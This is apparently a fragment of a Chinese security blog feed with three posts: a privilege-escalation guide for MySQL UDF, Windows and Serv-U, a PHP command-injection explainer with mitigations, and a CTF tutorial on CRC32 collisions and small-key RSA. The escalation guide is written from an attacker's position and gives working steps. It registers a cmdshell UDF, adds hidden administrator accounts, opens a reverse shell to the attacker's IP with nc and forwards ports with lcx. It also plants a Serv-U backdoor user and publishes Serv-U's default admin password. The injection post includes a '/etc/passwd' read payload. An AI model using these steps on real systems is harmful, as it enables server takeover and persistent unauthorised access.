+<p><strong>具体流程如下：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">create function cmdshell returns string soname &apos;udf.dll&apos;;</div><div class="line">select cmdshell(&apos;net user waitalone waitalone.cn /add&apos;);</div><div class="line">select cmdshell(&apos;net localgroup administrators waitalone /add&apos;);</div><div class="line">drop function cmdshell; 删除函数</div><div class="line">delete from mysql.func where name=&apos;cmdshell&apos;  删除函数</div></pre></td></tr></table></figure></p>
+<p>注意：<br>1、导出的文件名不一定非是xxx.dll，可以是任意的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">create function sys_eval returns string soname &apos;udf.xox&apos;;</div></pre></td></tr></table></figure></p>
+<p>2、提示错误 Can’t open shared library ‘fun.dll’ (errno: 2 )<br>除了udf不存在、udf被杀，还有可能是你的udf版本不对，你拿32位的udf去在64位系统注册的话，一样会提示错误。<br>3、某些情况下，我们会遇到Can’t open shared library的情况，这时就需要我们把udf.dll导出到lib\plugin目录下才可以，但是默认情况下plugin不存在，可以利用NTFS ADS流来创建文件夹的方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">select @@basedir;  //查找到mysql的目录</div><div class="line">select &apos;It is dll&apos; into dumpfile &apos;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION&apos;;  //利用NTFS ADS创建lib目录</div><div class="line">select &apos;It is dll&apos; into dumpfile &apos;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION&apos;; //利用NTFS ADS创建plugin目录</div></pre></td></tr></table></figure></p>
+<p>4、降权的mysql一样有用，能注册dll的话你一样能够执行命令，不过权限是根据mysql来的， 在不支持aspx，ws、shell.application被删得情况下还有一丝希望。</p>
+<h4 id="0x02-反弹端口连接提权"><a href="#0x02-反弹端口连接提权" class="headerlink" title="0x02 反弹端口连接提权"></a>0x02 反弹端口连接提权</h4><p>假如我们扫到了一个mysql的root弱密码，并且可以外连，但是服务器上面的网站又无法Getshell，这时我们怎么办呢？<br>1、利用mysql客户端工具连接mysql服务器，然后执行下面的操作。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mysql.exe -h 172.16.10.11 -uroot -p</div><div class="line">Enter password:</div><div class="line">mysql&gt; \. c:\mysql.txt</div><div class="line">mysql&gt;select backshell(&quot;YourIP&quot;,2010);</div></pre></td></tr></table></figure></p>
+<p>2、本地监听你反弹的端口<br>nc.exe -vv -l -p 2010<br>成功后，将获得一个system权限的cmdshell，其实这个也是利用的UDF提权。</p>
+<h3 id="0x02-Windows提权"><a href="#0x02-Windows提权" class="headerlink" title="0x02 Windows提权"></a>0x02 Windows提权</h3><p>操作系统漏洞提权<br>systeminfo<br>查看修补的补丁编号<br>PR               -pr.exe<br>巴西烤肉<br>IIS6溢出     -iis6.exe<br>LPK劫持     -lpk.dll</p>
+<p>当我们拿到一个低权限的webshell后，一般先探测服务器内部的信息，以找见可以提权的条件和桥梁。什么叫服务器的总体环境呢？例如：目标服务器开启的端口、进程、系统服务，安装了哪些程序，系统安全的大体设置。</p>
+<p><strong>为什么要获取服务器的这些总体信息呢？</strong><br>1、端口信息，可以让我们知道服务器开了哪些端口？哪些端口可以利用？哪些端口对应的服务或程序可以利用？或是对方还开了哪些我们不知道的服务（比如对方又开了一些不常用的端口来运行高权限的WEB服务，如tomcat等）。<br>比如，SERV-U修改了本地管理端口，我们也可以通过端口和进程信息进行了解。<br>2、进程信息，可以让我们知道服务器运行了哪些程序，管理员喜欢开什么程序，或正在运行什么程序。有哪些防护（比如杀毒软件，防火墙等信息）<br>3、系统服务信息，可以让我们了解，哪些服务是运行的，哪些服务可以利用。第三方服务的路径以及启动方式等信息。<br>如果第三方服务，是装在某些特殊目录，我们可以通过查询系统服务信息获得后，用CACLS命令查询其是否有权限进行修改或写入等操作。若可以写入，或修改，我们就可以替换或修改服务程序来达到提权的目的。<br>4、系统环境变量，也可以让我们获得一些信息，比如安装了哪些程序，哪些变量我们可以利用。<br>5、系统权限的设置的探测，我们可以通过一些疏漏的地方进行利用，以达到提权的目的。</p>
+<p>通过常规web渗透，已经拿到webshell。那么接下来作重要的就是探测系统信息，提权，针对windows想办法开启远程桌面连接，针对linux想办法使用反弹shell来本地连接。<br>Webshell应该都可以调用系统cmd执行一些简单的命令，那么whoami（查看当前权限），netuser（查看用户/组），systeminfo（查看系统补丁修复情况）等常见命令应该是首先被执行探测的。</p>
+<p>Windows常见提权思路：(前提已经getshell但是权限不大的前提下)<br>1、查看基本的信息<br><img src="http://p1.bpimg.com/567571/13147d28fa2fb8a3.jpg" alt=""><br>2、使用cmd执行命令<br>尝试使用cmd执行命令<br><img src="http://p1.bqimg.com/567571/5ffe413926ff6008.jpg" alt=""><br>找可写目录<br><img src="http://p1.bqimg.com/567571/d89407b44f300b55.jpg" alt=""><br>尝试上传cmd.exe<br><img src="http://i1.piimg.com/567571/aa0d12c24672e23f.jpg" alt=""><br>写一个ASPX马<br><img src="http://i1.piimg.com/567571/113718d1496a9569.jpg" alt=""><br>继续上传cmd.exe，并执行cmd命令<br><img src="http://i1.piimg.com/567571/7579dd7491853a30.jpg" alt=""><br>3、提升权限<br>查看未安装补丁<br><img src="http://p1.bpimg.com/567571/a2fdef79c17c6a60.jpg" alt=""><br>上传exp（iss6.exe）提权<br><img src="http://p1.bqimg.com/567571/e4a178638e6ba70d.jpg" alt=""><br><img src="http://p1.bqimg.com/567571/0f75bb881053f077.jpg" alt=""><br>4、添加用户<br>添加远程连接用户<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">net user hacker 123 /add </div><div class="line">net localgroup administrators hacker /add</div></pre></td></tr></table></figure></p>
+<h3 id="0x03-Server-U提权"><a href="#0x03-Server-U提权" class="headerlink" title="0x03 Server-U提权"></a>0x03 Server-U提权</h3><p>Serv-U提权，属于一种漏洞，该漏洞是使用Serv-u本地默认管理端口，以默认管理员登陆新建域和用户来执行命令。<br>漏洞是使用Serv-u本地默认管理端口，以默认管理员登陆新建域和用户来执行命令，Serv-u&gt;3.x版本默认本地管理端口是：43958，默认管理员：LocalAdministrator，默认密码：#l@$ak#.lk;0@P，这是集成在Serv-u内部的，可以以Guest权限来进行连接，对Serv-u进行管理。</p>
+<p>serv-u提权主要分为serv-u6及以前版本、serv-u7以下版本的提权，serv-u7版本提权等</p>
+<p><strong>主要提权方法：</strong></p>
+<p>一、serv-u ftp本地溢出权限提升(使用6.0以及以前版本)</p>
+<p>1、用Serv-U提权综合工具生成提权工具serv_u.exe<br>2、先上传 serv_u.exe 到一个盘符下 比如是d盘<br>3、执行命令 d:\serv_u.exe<br>4、d:\serv_u.exe “net user username password /add” (注意命令要有引号)<br>5、d:\serv_u.exe “net localgroup administrators username /add” (注意命令要有引号)</p>
+<p>二、ServUDaemon.ini 文件重写后提权(对ServUDaemon.ini有写入的权限)</p>
+<p>先修改Domain来添加用户<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[Domain1]</div><div class="line">User2=spider|1|0</div></pre></td></tr></table></figure></p>
+<p>然后在ServUDaemon.ini文件尾部追下如下代码来添加用户的详细信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">[USER=spiger|1]</div><div class="line">Password=sbd8b58b5c201ee5cc20f9a8551197d4a5</div><div class="line">HomeDir=c:\</div><div class="line">RelPaths=3</div><div class="line">TimeOut=600</div><div class="line">Maintenance=System</div><div class="line">Access1=C:\|RWAMELCDP</div><div class="line">Access2=d:\|RWAMELCDP</div><div class="line">Access3=e:\|RWAMELCDP</div><div class="line">SKEYValues=</div></pre></td></tr></table></figure></p>
+<p>添加上述代码并保存后，就会在serv-u中添加用户名为spiger，密码是123456。<br>通过在本地命令行执行ftp 目标IP地址  命令来连接目标FTP服务器。连接后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">quote site exec net user spiger 123456 /add</div><div class="line">quote site exec net localgroup administrators spiger /add</div></pre></td></tr></table></figure></p>
+<p>ps：上述添加的文件中最重要的是Maintenance=System这句，有了这句添加的FTP用户才是管理员用户，才会有命令执行权限（因为最后是通过FTFP执行命令来添加系统用户的）。</p>
+<p>三、serv-u配置文件无修改权限，但是可以看到配置文件，进行口令破解</p>
+<p>看到FTP用户的配置文件ServUDaemon.ini，在其中找到Maintenance=System的用户，该用户就是系统管理员。如果能够成功破解系统管理员的口令，就可以利用该管理员执行添加系统管理员的用户（类似方法二）。<br>serv-u配置文件中Password字段就是用户口令加密变换后的字符串，破解方法：去掉前两位，剩下的进行md5破解，破解后再去掉前两位，剩下的就是FTP用户口令。</p>
+<p>四、serv-u配置文件无修改权限，可以用Serv-u管理用户来进行提权（这是最常用的方法，一般大马中集成的serv-u提权方法就是本方法）</p>
+<p>serv-u的默认管理端口是43958，只有本地才能进行连接这个管理端口。serv-u默认管理账号是LocalAdministrator,默认密码是”#l@$ak#.lk;0@P“，这个密码是固定的。如果网站管理员忘记修改密码，那么获取webshell后就可以连接该端口后执行命令来添加系统用户。<br><img src="http://i1.piimg.com/567571/437f6d2666181f4c.png" alt=""><br>虽然，网站管理员很少修改serv-u的这个默认管理账号和口令，但是如果管理员修改了，我们还可以通过查看ServUAdmin.exe文件来获取管理账号和口令。方法如下：下载serv-u目录下的ServUAdmin.exe文件，在本地用文本文件打开，查找LocalAdministrator字符来获取口令位置：<br><img src="http://i1.piimg.com/567571/d95060265749733f.png" alt=""></p>
+<p>可以看到serv-u的管理账号和口令都在文件中，仔细查找即可（如果连用户名也修改了，就搜127.0.0.1或记住账号和密码在文件中的位置）。获取管理账号和口令后就可以利用大马自带的serv-u来进行提权了。</p>
+<p>五、serv-u ftp转发端口<br>我们可以利用端口转发的方式来将其管理端口转发的本地，进而提权。在目标Webshell上运行LCX：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lcx -slave 你的IP 5000 127.0.0.1 43958</div></pre></td></tr></table></figure></p>
+<p>在本机上运行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lcx -listen 5000 21</div></pre></td></tr></table></figure></p>
+<p>打开本地的SERV_U 在IP上填入127.0.0.1 帐号写LocalAdministrator 密码#l@$ak#.lk;0@P此时的连接过程是：本机连接21端口——&gt;转发往本机5000端口——&gt;管道连接至远程机5000端口——&gt;转发至远程43958端口<br>连接成功后，在本机登陆Serv_U就相当于登陆了远程的Serv_U。你可以FTP登陆本机IP,输入上面的帐号和密码，在远程FTP服务器上执行命令。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;0x01-mysql提权&quot;&gt;&lt;a href=&quot;#0x01-mysql提权&quot; class=&quot;headerlink&quot; title=&quot;0x01 mysql提权&quot;&gt;&lt;/a&gt;0x01 mysql提权&lt;/h3&gt;&lt;h4 id=&quot;0x01-UDF提权&quot;&gt;&lt;a href=&quot;#0x01-UDF提权&quot; class=&quot;headerlink&quot; title=&quot;0x01 UDF提权&quot;&gt;&lt;/a&gt;0x01 UDF提权&lt;/h4&gt;&lt;p&gt;1、利用UDF提权&lt;br&gt;udf提权这是最常见的提权方式，也就是User defined Function,用户定义函数。是一类对MYSQL服务器功能进行扩充的代码，通常是用C（或C++）写的。通过添加新函数，性质就象使用本地MYSQL函数abs()或concat()。当你需要扩展MYSQL服务器功能时，UDF通常是最好的选择。但同时，UDF也是黑客们在拥有低权限mysql账号时比较好用的一种提权方法。
+    
+    </summary>
+    
+    
+      <category term="提权" scheme="http://yoursite.com/tags/%E6%8F%90%E6%9D%83/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>命令执行</title>
+    <link href="http://yoursite.com/2017/03/05/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    <id>http://yoursite.com/2017/03/05/命令执行/</id>
+    <published>2017-03-05T03:13:23.000Z</published>
+    <updated>2017-03-05T03:27:40.750Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="0x01-命令注入"><a href="#0x01-命令注入" class="headerlink" title="0x01 命令注入"></a>0x01 命令注入</h3><p>PHP命令注入攻击漏洞是PHP应用程序中常见的脚本漏洞之一，国内著名的Web应用程序Discuz!、DedeCMS等都曾经存在过该类型漏洞。</p>
+<p><strong>Command Injection，即命令注入攻击</strong>，是指由于Web应用程序对用户提交的数据过滤不严格，导致黑客可以通过构造特殊命令字符串的方式，将数据提交至Web应用程序中，并利用该方式执行外部程序或系统命令实施攻击，非法获取数据或者网络资源等。<a id="more"></a></p>
+<h3 id="0x02-命令注入原因"><a href="#0x02-命令注入原因" class="headerlink" title="0x02 命令注入原因"></a>0x02 命令注入原因</h3><p>PHP命令注入攻击：<br>PHP命令注入攻击存在的主要原因是Web应用程序员在应用PHP语言中一些具有命令执行功能的函数时，对用户提交的数据内容没有进行严格的过滤就带入函数中执行而造成的。例如，当黑客提交的数据内容为向网站目录写入PHP文件时，就可以通过该命令注入攻击漏洞写入一个PHP后门文件，进而实施进一步的渗透攻击。<br>在PHP中，可以执行命令的函数有system()、exec()、shell_exex()、passthru()、pcntl_exex()、popen()、proc_open()，一共七个函数，另外反引号(`)也可以执行命令，不过这种方法也是调用的shell_exec()函数。<br>PHP中可以使用下列四个函数来执行外部的应用程序或函数：<strong>system()、exec()、passthru()、shell_exec()</strong>，四个函数的原型如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">string system(string command, int &amp;return_var)</div><div class="line">    command 要执行的命令； return_var 存放执行命令的执行后的状态值。</div><div class="line">string exec (string command, array &amp;output, int &amp;return_var)</div><div class="line">    command 要执行的命令，output 获得执行命令输出的每一行字符串，return_var 存放执行命令后的状态值。</div><div class="line">void passthru (string command, int &amp;return_var)</div><div class="line">    command 要执行的命令，return_var 存放执行命令后的状态值。</div><div class="line">string shell_exec (string command)</div><div class="line">    command 要执行的命令，如下例所示，表示通过提交http://www.sectop.com/ex1.php?dir=| cat /etc/passwd操作，执行命令变成了system(&quot;ls -al | cat /etc/passwd&quot;)，输出/etc/passwd 文件的具体内容。</div></pre></td></tr></table></figure></p>
+<p>//ex1.php </p>
+<pre><code>&lt;?php
+$dir = $_GET[&quot;dir&quot;]; 
+if (isset($dir)) 
+{ 
+    echo &quot;&quot;; 
+    system(&quot;ls -al &quot;.$dir); 
+    echo &quot;&quot;; 
+} 
+?&gt; 
+</code></pre><p>popen()、proc_open()函数不会直接返回执行结果，而是返回一个文件指针。<br>popen()需要两个参数，一个是执行的命令，另一个是指针文件的连接模式，有r和w代表读和写。</p>
+<pre><code>&lt;?php
+popen(&apos;whoami&apos; &gt;&gt;D:/test.txt&apos;,&apos;r&apos;);
+?&gt;
+</code></pre><p>执行完之后可以在D盘根目录看到test.txt文件，内容为用户名。    </p>
+<p><strong>&amp;与&amp;&amp;与|的区别</strong><br>在Linux上，上面的;也可以用|、||代替<br>;前面的执行完执行后面的<br>|是管道符，显示后面的执行结果<br>||当前面的执行出错时执行后面的<br>在Windows上，不能用;可以用&amp;、&amp;&amp;、|、||代替<br>&amp;前面的语句为假则直接执行后面的<br>&amp;&amp;前面的语句为假则直接出错，后面的也不执行<br>|直接执行后面的语句<br>||前面出错执行后面的<br>Command 1&amp;&amp;Command 2<br>先执行Command 1，执行成功后执行Command 2，否则不执行Command 2<br>Command 1&amp;Command 2<br>先执行Command 1，不管是否成功，都会执行Command 2<br><img src="http://p1.bqimg.com/567571/b874cceb7f1ceedd.jpg" alt=""><br>“|”是管道符，表示将Command 1的输出作为Command 2的输入，并且只打印Command 2执行的结果。<br><img src="http://p1.bqimg.com/567571/bdc67386a04b9902.jpg" alt=""></p>
+<h3 id="0x03-挖掘经验"><a href="#0x03-挖掘经验" class="headerlink" title="0x03 挖掘经验"></a>0x03 挖掘经验</h3><p>大部分直接搜索关键函数进行漏洞挖掘。</p>
+<h3 id="0x04-漏洞防范"><a href="#0x04-漏洞防范" class="headerlink" title="0x04 漏洞防范"></a>0x04 漏洞防范</h3><p>PHP中命令注入攻击漏洞带来的危害和影响很严重。防范命令注入攻击漏洞的存在可以通过以下几种方法。</p>
+<p>1、尽量不要执行外部的应用程序或命令。<br>2、使用自定义函数或函数库实现外部应用程序或命令的功能。<br>3、 在执行system、eval等命令执行功能的函数前，确定参数内容。<br>4、escapeshellcmd()函数会转义命令中的所有shell元字符来完成工作。这些元字符包括：#&amp;;`,|*?~&lt;&gt;^()[]{}$\。例如写入一句话可被过滤 ，所以命令无法执行成功，无法生成一句话文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">echo(escapeshellcmd($_GET[&apos;cmd&apos;]));</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+<p><img src="http://p1.bqimg.com/567571/5df4043ed95d4c3c.jpg" alt=""><br>可以看到这些字符过滤的方法就是在前面加了一个^符号，而在Linux下则是在子父母前面加了反斜杠()。<br>5、使用escapeshellarg函数处理相关参数。Escapeshellarg函数会将任何引起参数或命令结束的字符进行转义，如单引号“’”会被转义为“\’”，双引号“””会被转义为“\””，分号“;”会被转义为“\;”，这样escapeshellarg会将参数内容限制在一对单引号或双引号里面，转义参数中所包含的单引号或双引号，使其无法对当前执行进行截断，实现防范命令注入攻击的目的。<br>6、使用safe_mode_exec_dir执行可执行的文件路径。将php.ini文件中的safe_mode设置为On，然后将允许执行的文件放入一个目录中，并使用safe_mode_exec_dir指定这个可执行的文件路径。这样，在需要执行相应的外部程序时，程序必须在safe_mode_exec_dir指定的目录中才会允许执行，否则执行将失败。<br>7、参数白名单：可以在代码中或者配置文件中限定某些参数，在使用的时候匹配一下这个参数在不在白名单列表了里面，如果不在则直接显示错误提示即可。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;0x01-命令注入&quot;&gt;&lt;a href=&quot;#0x01-命令注入&quot; class=&quot;headerlink&quot; title=&quot;0x01 命令注入&quot;&gt;&lt;/a&gt;0x01 命令注入&lt;/h3&gt;&lt;p&gt;PHP命令注入攻击漏洞是PHP应用程序中常见的脚本漏洞之一，国内著名的Web应用程序Discuz!、DedeCMS等都曾经存在过该类型漏洞。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Command Injection，即命令注入攻击&lt;/strong&gt;，是指由于Web应用程序对用户提交的数据过滤不严格，导致黑客可以通过构造特殊命令字符串的方式，将数据提交至Web应用程序中，并利用该方式执行外部程序或系统命令实施攻击，非法获取数据或者网络资源等。
+    
+    </summary>
+    
+    
+      <category term="php" scheme="http://yoursite.com/tags/php/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>CTF中的CRYPTO</title>
+    <link href="http://yoursite.com/2017/03/02/CTF%E4%B8%AD%E7%9A%84CRYPTO/"/>
+    <id>http://yoursite.com/2017/03/02/CTF中的CRYPTO/</id>
+    <published>2017-03-02T11:29:28.000Z</published>
+    <updated>2017-03-04T02:33:54.426Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="0x01-CRC32碰撞"><a href="#0x01-CRC32碰撞" class="headerlink" title="0x01 CRC32碰撞"></a>0x01 CRC32碰撞</h3><h4 id="0x01-CRC32"><a href="#0x01-CRC32" class="headerlink" title="0x01 CRC32"></a>0x01 CRC32</h4><p>CRC全称为Cyclic redundancy check，即循环冗余校验码，是一种根据输入数据产生简短的固定位数校验码的散列函数。CRC主要用来检测或者校验数据经过传输或者保存后可能出现的错误，CRC32产生32位的散列值（即4字节）。<br>CRC32可以用于数据的校验，在WinRAR等压缩软件中也使用了这一技术，压缩包中每个文件都保存有一个对应的CRC32值，这个值是对压缩前的文件数据计算出来的散列值，在进行解压时会再次计算文件的CRC32值来进行对比，判断压缩包文件是否损坏。<a id="more"></a><br>尽管CRC32在错误检测中非常有用，但是并不能可靠地校验数据完整性（即数据没有发生任何变化），这是因为CRC多项式是线性结构，可以非常容易地故意改变数据而维持CRC不变，即存在产生碰撞的可能性。</p>
+<h4 id="0x02-CRC32计算"><a href="#0x02-CRC32计算" class="headerlink" title="0x02 CRC32计算"></a>0x02 CRC32计算</h4><p>为了快速方便的还原压缩包的内容，我们需要编程来计算CRC32的值。计算CRC32可以有多种方法，可以从网上找一个实现好的C/C++源文件，也可以使用Python提供的库函数来进行计算，这里我们选择后者。<br>Python的binascii模块提供了一个crc32方法，可以方便的计算所给参数的CRC32值。但是这里的计算结果有一点问题，因为计算出来的结果是一个有符号数，所以可能会看到结果为负数，因此需要将结果和0xFFFFFFFF进行一个位运算与操作。Python计算CRC32的代码如下：</p>
+<pre><code>import binascii
+def calcCRC32(s):
+    crc = binascii.crc32(s)
+    return crc &amp; 0xFFFFFFFF
+</code></pre><p>需要注意的是，前面提到CRC32会存在冲突的可能，也就是说，不同的内容在经过计算后得到的CRC32散列值可能是一样的。</p>
+<p><img src="http://p1.bpimg.com/4851/7d3305badacd27ba.png" alt=""></p>
+<h4 id="0x03-使用脚本进行快速破解"><a href="#0x03-使用脚本进行快速破解" class="headerlink" title="0x03 使用脚本进行快速破解"></a>0x03 使用脚本进行快速破解</h4><p>经过前面的分析，我们已经知道了可以通过CRC32来还原压缩包中的4字节文本，以及通过Python计算CRC32的方法，现在只需要给Python脚本添加枚举功能即可，代码如下</p>
+<pre><code>#!/usr/bin/env python
+# -*- coding:utf-8 -*-
+
+import datetime
+
+import binascii
+
+def showTime():
+    print datetime.datetime.now().strftime(&quot;%H:%M:%S&quot;)
+
+def crack():
+    crcs = set([0xE761062E, 0x2F9A55D3, 0xF0F809B5,
+    0x645F52A4, 0x0F448B76, 0x3E1A57D9, 0x3A512755])
+
+    r = xrange(32, 127)
+    for a in r:
+        for b in r:
+            for c in r:
+                for d in r:
+                    txt = chr(a)+chr(b)+chr(c)+chr(d)
+                    crc = binascii.crc32(txt)
+                    if (crc &amp; 0xFFFFFFFF) in crcs:
+                        print txt
+
+
+
+if __name__ == &quot;__main__&quot;:
+    showTime()
+    crack()
+    showTime()
+</code></pre><p><img src="http://p1.bpimg.com/4851/344187c4eab2c70d.jpg" alt=""></p>
+<h3 id="0x02-RSA算法"><a href="#0x02-RSA算法" class="headerlink" title="0x02 RSA算法"></a>0x02 RSA算法</h3><p>RSA属于非对称加密算法，因为RSA使用了两个不同的密钥分别用于加密和解密，这两个密钥称之为公私钥对，其中公钥用于加密，且公钥是公开的，而私钥用于解密，私钥是私有的。</p>
+<h4 id="0x01-RSA的计算过程如下"><a href="#0x01-RSA的计算过程如下" class="headerlink" title="0x01 RSA的计算过程如下"></a>0x01 RSA的计算过程如下</h4><pre><code>1. 找到两个大素数p和q，计算出n = pq；
+2. 计算出φ(n) = (p-1)*(q-1)，选择一个e，满足1 &lt; e &lt;φ(n)，且gcd(φ(n), e) = 1；
+3. 计算出d，使得d满足ed % φ(n) = 1；
+此时，已经生成了公私钥对，其中(e, n)为公钥，(d, n)为私钥。
+4. 对于明文M，有密文C = M^e % n，此为加密过程；
+5. 对于密文C，有明文M = C^d % n，此为解密过程；
+</code></pre><h4 id="0x02-相关知识"><a href="#0x02-相关知识" class="headerlink" title="0x02 相关知识"></a>0x02 相关知识</h4><p>一、素数</p>
+<pre><code>素数（Prime Number）又称质数，是指在大于1的自然数中，约数只有1和它本身的数。
+
+根据素数的定义，要判断一个数n是否是素数，只需要看n是否能够被2, 3, 4, …, n-1里面的任意一个数整除，如果存在则说明不是素数。实际上，只需要判断2, 3, …, sqrt(n)里面的数即可。
+</code></pre><p>二、最大公约数</p>
+<pre><code>假如整数n除以m，结果是一个整数（即余数为0），那么m为n的约数。最大公约数（Greatest Common Divisor，GCD）指某几个整数共有约数中最大的一个，我们使用gcd(a, b)表示a和b的最大公约数。
+
+使用辗转相除法（也称之为欧几里得算法），可以求出两个数的最大公约数。假设a &gt; b，则欧几里得算法的核心表示为gcd(a, b) = gcd(b, a%b)，这样不断的递归进行计算，直到b等于0，则此时的a即为最大公约数。
+</code></pre><p>三、扩展欧几里得算法</p>
+<pre><code>欧几里得算法用于求出最大公约数d = gcd(a, b)，而扩展欧几里得算法不仅计算出最大公约数d，而且还有另外两个整数x和y，他们满足如下方程：ax + by = d = gcd(a, b)。很明显，这里x和y具有相反的正负号。
+</code></pre><p>四、乘法逆元</p>
+<pre><code>对于给定的书x和n，如果存在另外一个数y，使得xy % n = 1，那么我们称x模n的乘法逆元为y。乘法逆元的概念类似于小学数学中的倒数的概念，只不过此时为xy = 1。
+</code></pre><h4 id="0x03-RSA计算"><a href="#0x03-RSA计算" class="headerlink" title="0x03 RSA计算"></a>0x03 RSA计算</h4><p>给定RSA密文[971,922,605,1446,1704,889,2090,605,1899,1915,2088,1988,1235,1032,65,922,958,1988,2144,591,1988,2270,2088,1032,65,958,2233]，已知RSA的公钥为{7,2449}，请还原出对应的明文。</p>
+<p><strong>质因数分解</strong></p>
+<p>RSA面临的一种攻击方式为数学攻击，实质上就是试图分解两个素数的乘积，给定RSA的公钥{e, n}，根据RSA的定义，如果能够将n分解为两个素数的乘积，即n = pq，那么就可以计算出d了，也就是得到私钥{d, n}。</p>
+<p>需要指出的是，如果n非常大，那么这样的攻击基本上是不可行的，以Gmail为例，其n的长度为256字节，即所说的2048位，就目前的计算条件而言，在私钥不泄露的情况下是安全的。对于本题给定的n=2449而言，我们可以轻易的将其分解为两个素数的乘积。进行质因数分解的代码如下：</p>
+<pre><code>import math
+def isPrime(n):
+
+    if n &lt;= 1:
+        return False
+    for i in xrange(2, int(math.sqrt(n) + 1)):
+        if n % i == 0:
+            return False
+    return True   
+
+def crack(n):    
+    for p in xrange(2, n):
+        for q in xrange(p+1, n):
+            if p*q == n and isPrime(p) and isPrime(q):
+                return (p, q)
+</code></pre><p>其中，isPrime用于判断一个数是否是素数，执行crack即可返回分解的结果。执行上面的代码，可以将2449分解为31与79的乘积。</p>
+<p><strong>私钥获取</strong><br>在前面，我们已经将2449分解为31与79的乘积，即p=31，q=79，因此可以计算出φ(n) = (p-1)<em>(q-1) = 30</em>78 = 2340，现在已经给定了e=7，只需要找到一个d，使得ed % φ(n) = 1即可。在数据量很小的情况下，这里直接枚举也是可以求出d的，但是更加正式的方法是使用扩展欧几里得算法进行求解。<br>对于扩展欧几里得算法的具体求解过程，因为篇幅原因这里不进行讲解，有兴趣的同学可以查阅相关资料。这里主要讲解为什么通过扩展欧几里得算法可以求出d。<br>对于给定的两个数a和b，扩展欧几里得可以求出最大公约数gcd(a,b)以及x,y使得：<br>      ax + by = gcd(a, b)<br> 在RSA中，已知φ(n)和e，要求求出d，使得ed % φ(n) = 1。应用到扩展欧几里得算法中，另a=φ(n)，b=e，已知 gcd(φ(n), e) = 1，则有：<br>      φ(n)<em>x + e</em>y = 1<br> 因为φ(n)<em>x %φ(n) = 0，所以自然有ey %φ(n) = 1，即扩展欧几里得求出的y就是我们所要的d。需要注意的是，求出来的y可能是负数，因此y需要不断的加上φ(n)，直到大于0，因为φ(n)</em>x + e<em>y =φ(n)</em>(x-e) + e*(y+φ(n))<br>求解私钥d的代码如下：</p>
+<pre><code>def extGcd(a, b):
+    if a &lt; b:
+        return extGcd(b, a)
+    if b == 0:
+        return a, 1, 0
+    gcd, x, y = extGcd(b, a%b)
+    return gcd, y, x-a/b*y 
+def getD(n, e):
+    p, q = crack(n) # call crack(n) to break n to p*q
+    fai = (p-1)*(q-1)
+    gcd, x, y = extGcd(fai, e)
+    while y &lt; 0:
+        y += fai
+    return y
+</code></pre><p><strong>RSA解密</strong><br> 经过前面的推导分析，我们已经成功计算出了RSA的私钥{d, n}，现在只需要执行解密操作即可，解密过程为C^d % n。但是现在面临的一个问题是，在计算C^d时可能存在一些问题，比如当C和d都非常大时，C^d的计算可能非常耗时且结果非常大，实际上并不需要计算出完整的C^d，这里可以在数学上做一些优化，具体不进行讲解，有兴趣请自行查阅了解。Python自带的pow函数可以快速计算出C^d % n，即pow(C, d, n)。</p>
+<pre><code>#!/usr/bin/env python
+# -*- coding:utf-8 -*-
+import math
+def isPrime(n):
+    if n &lt;= 1:
+        return False
+    for i in xrange(2, int(math.sqrt(n) + 1)):
+        if n % i == 0:
+            return False
+    return True
+
+def crack(n):
+    for p in xrange(2, n):
+        for q in xrange(p+1, n):
+            if p*q == n and isPrime(p) and isPrime(q):
+                return (p, q)
+
+def extGcd(a, b):
+    if a &lt; b:
+        return extGcd(b, a)
+    if b == 0:
+        return a, 1, 0
+    gcd, x, y = extGcd(b, a%b)
+    return gcd, y, x-a/b*y
+
+def getD(n, e):
+    p, q = crack(n)
+    fai = (p-1)*(q-1)
+    gcd, x, y = extGcd(fai, e)
+    while y &lt; 0:
+        y += fai
+    return y
+
+def decrypt(n, e, ciphertext):
+    plaintext = []
+    d = getD(n, e)
+    for num in ciphertext:
+        num = pow(num, d, n)
+        plaintext.append(chr(num))
